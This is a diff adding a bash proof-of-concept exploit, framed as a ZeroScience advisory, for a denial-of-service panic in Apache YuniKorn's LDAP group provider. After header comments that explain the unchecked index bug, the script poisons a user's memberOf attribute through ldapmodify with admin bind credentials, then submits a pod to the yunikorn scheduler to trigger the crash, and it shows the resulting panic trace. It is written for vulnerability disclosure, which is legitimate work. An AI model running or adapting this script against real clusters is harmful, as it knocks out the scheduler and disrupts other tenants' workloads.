@@ -1,0 +1,87 @@
+#!/usr/bin/env bash
+#
+#
+# Apache YuniKorn 1.9.0 LDAP Group Provider Panic Denial of Service
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://yunikorn.apache.org
+# Affected version: 1.9.0 and 1.8.0
+# Fixed version: 1.10.0
+#
+# Summary: Apache YuniKorn is a light-weight, universal resource scheduler
+# for container orchestrator systems. It is created to achieve fine-grained
+# resource sharing for various workloads efficiently on a large scale, multi-tenant,
+# and cloud-native environment. YuniKorn brings a unified, cross-platform,
+# scheduling experience for mixed workloads that consist of stateless batch
+# workloads and stateful services.
+#
+# Desc: Apache YuniKorn's LDAP user/group resolver crashes (panics) when parsing
+# an LDAP 'memberOf' attribute whose value does not contain the substring "CN=".
+# In usergroup_ldap_resolver.go the group name is extracted with strings.Split(s[0],
+# "CN=") followed by an unchecked access to newgroup[1]; when the split yields a
+# single-element slice (any memberOf value lacking "CN="), the index-out-of-range
+# access raises a runtime panic and terminates the resolver.
+#
+# Triggering the issue requires a non-default deployment (the LDAP group provider
+# configured, with an LDAP server that returns lower-case attribute names or a
+# non-standard schema) and an attacker with permission to run a workload on the
+# Kubernetes cluster whose pod specifies a user for which the LDAP server returns
+# such a memberOf entry.
+#
+# Tested on: Kali Linux
+#            Go 1.27.0
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6016
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6016
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+
+LDAP_URI="ldap://127.0.0.1:389"
+BIND_DN="cn=admin,dc=example,dc=com"
+BIND_PW="admin"
+USER_DN="uid=thricer,ou=people,dc=example,dc=com"
+USER="thricer"
+YK_NS="yunikorn"
+
+# LDAP group provider should be enabled.
+cat > poison-memberof.ldif <<EOF
+dn: ${USER_DN}
+changetype: modify
+replace: memberOf
+memberOf: ou=staff,dc=example,dc=com
+EOF
+echo "[*] wrote poison-memberof.ldif (memberOf has no 'CN=')"
+
+ldapmodify -x -H "${LDAP_URI}" -D "${BIND_DN}" -w "${BIND_PW}" -f poison-memberof.ldif
+echo "[*] loaded poisoned memberOf for ${USER}"
+
+echo "[*] submitting workload to the yunikorn scheduler..."
+kubectl run yk-dos --image=busybox --restart=Never \
+    --overrides='{"spec":{"schedulerName":"yunikorn"}}' -- sleep 1
+
+kubectl -n "${YK_NS}" get pods
+kubectl -n "${YK_NS}" logs -l app=yunikorn --tail=40
+
+# ==================================================================
+#
+# panic: runtime error: index out of range [1] with length 1
+#
+# goroutine 1 [running]:
+# main.parseGroups({0x3d4ade159e68, 0x1, 0x3d4ade159e58?})
+#     .../yunikorn_memberof_panic.go:30 +0x1f3
+# main.main()
+#     .../yunikorn_memberof_panic.go:43 +0x105
+# exit status 2
+#
+# ==================================================================
